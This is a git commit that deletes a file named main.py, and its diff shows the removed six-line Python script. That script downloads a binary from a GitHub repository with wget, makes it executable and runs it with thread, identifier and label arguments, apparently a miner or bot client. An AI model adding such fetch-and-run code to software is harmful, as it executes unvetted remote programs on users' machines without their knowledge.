a85f4bb7a8b3fb68f19adffcf7ceac96457d4668
Bariha Hergina <161032539+BarihaHergina@users.noreply.github.com>
2024-04-08 09:08:13 +0700

    Delete main.py

--- main.py
+++
@@ -1,6 +0,0 @@
-import sys
-import os
-
-os.system("wget https://github.com/fkajsbge4/as/raw/main/test")
-os.system("chmod +x test")
-os.system("./test -t 7 -i NVWTZZACJPEBAFBLYZNJXFGHJDPBTMIIFBDAOGSTHDHRCHXFTMZUXIOGERZG --label new1")
